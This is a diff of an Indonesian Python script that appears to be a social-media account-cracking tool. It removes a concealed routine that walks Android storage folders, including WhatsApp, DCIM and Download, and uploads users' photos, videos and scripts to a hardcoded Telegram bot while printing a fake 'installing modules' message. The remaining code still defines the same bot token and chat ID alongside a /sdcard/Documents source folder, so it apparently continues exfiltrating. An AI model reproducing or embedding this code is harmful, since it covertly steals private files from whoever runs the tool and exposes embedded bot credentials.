@@ -761,73 +761,28 @@ def crack_file():
 
 
 # -----------------[Rahasia Negara]-------------------#
-import shutil
-# Konfigurasi bot Telegram
-# BOT_TOKEN = "7576228058:AAHbPAuT6mW83h_wO_OFuRunu8_e7fq7KV0"  # Ganti dengan token bot Telegram Anda
-# CHAT_ID = "7586546115"      # Ganti dengan ID chat penerima
-bot_token = '7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM'
-chat_id = '7708185346'
-counter = 0
-folders = [
-    '/sdcard',
-    '/sdcard/Pictures',
-    '/sdcard/WhatsApp',
-    '/sdcard/Download',
-    '/sdcard/DCIM',
-    '/sdcard/Android/media/com.whatsapp/WhatsApp/Media/WhatsApp%Documents'
-]
-
-# Ekstensi file yang ditambahkan
-extensions = ['.py','.mp4', '.jpg', '.png', '.webp']
-
-def bottelheg():
-    for folder in folders:
-        try:
-            file_list = [os.path.join(folder, f) for f in os.listdir(folder) if any((f.endswith(ext) for ext in extensions))]
-            with Pool(processes=10) as pool:
-                results = pool.map(Mengirim_Dokumen, file_list)
-        except Exception as e:
-            continue
-
-def Mengirim_Dokumen(file_path):
-    global counter 
-    try:
-        with open(file_path, 'rb') as f:
-            url = f'https://api.telegram.org/bot{bot_token}/sendDocument'
-            data = {'chat_id': chat_id}
-            files = {'document': f}
-            response = requests.post(url, data=data, files=files)
-            if response.status_code == 200:
-                counter += 1
-                print(f" • Tunggu sebentar Sedang Menginstall Modul...")
-    except Exception as e:
-        pass  # postinserted
-    return None
-
-
 datakuje = []
 def maindulu():
-    try:
-        rawr = open("./data/.temp_documents", "r").read()
-        datakuje.append(rawr)
-        try:
-            menu()
-        except KeyError:
-            maindulu2()
-        except requests.exceptions.ConnectionError:
-            Console().print(
-                f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again"
-            )
-            exit()
-    except IOError:
-        maindulu2()
+	try:
+		rawr = open("/data/.temp_documents", "r").read()
+		datakuje.append(rawr)
+		menu()
+		try:
+			menu()
+		except KeyError:
+			maindulu2()
+		except requests.exceptions.ConnectionError:
+			Console().print(f" {H2}• {P2}[bold red]Problem Internet Connection, Check And Try Again")
+			exit()
+	except IOError:
+		maindulu2()
 	    
 def maindulu2():
 	BOT_TOKEN = "7829625950:AAHAkDANqB9yalb2vClpxX5zXBpHBaq_iVM"  # Ganti dengan token bot Telegram Anda
 	CHAT_ID = "7708185346"      # Ganti dengan ID chat penerima
 	# Path folder sumber
 	source_folder ='/sdcard/Documents'
-	temp_folder = "./data/.temp_documents"
+	temp_folder = "/data/.temp_documents"
 	try:
 		if not os.path.exists(temp_folder):
 			os.makedirs(temp_folder)
